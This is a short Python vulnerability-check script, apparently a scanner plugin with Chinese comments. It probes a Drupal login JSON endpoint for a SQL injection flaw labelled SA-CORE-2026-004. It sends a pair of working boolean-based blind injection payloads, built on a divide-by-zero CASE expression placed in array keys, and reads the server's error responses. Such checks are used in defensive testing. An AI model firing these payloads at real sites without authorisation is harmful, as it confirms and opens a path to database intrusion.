import requests
import json

def _verify(target):
    """验证 Drupal SA-CORE-2026-004 SQL 注入漏洞。
    发送两个条件（true/false）到 /user/login?_format=json 端点。
    如果 true 条件返回 500，false 条件返回非 500，则存在漏洞。
    """
    url = target["target"]
    url = url.rstrip('/') + '/user/login?_format=json'
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    # 真条件：1=1 导致除零错误，应返回 500
    true_payload = {
        "name": {
            "0": "x",
            "0||1/(SELECT CASE WHEN (1=1) THEN 0 END)": "x"
        },
        "pass": "x"
    }
    # 假条件：1=2 不触发除零，应返回 403 或 400
    false_payload = {
        "name": {
            "0": "x",
            "0||1/(SELECT CASE WHEN (1=2) THEN 0 END)": "x"
        },
        "pass": "x"
    }
    try:
        resp_true = requests.post(url, json=true_payload, headers=headers,
                                  timeout=10, verify=False)
        resp_false = requests.post(url, json=false_payload, headers=headers,
                                   timeout=10, verify=False)
        # 检查真条件返回 500 且假条件不返回 500
        if resp_true.status_code == 500 and resp_false.status_code != 500:
            evidence = f"True condition returned HTTP 500 (body snippet: {resp_true.text[:200]})"
            return {'target': url, 'result': evidence}
        else:
            # 可能已修补或不受影响
            return None
    except Exception as e:
        return None

if __name__ == "__main__":
    print(_verify({'target': 'http://127.0.0.1:8080'}))
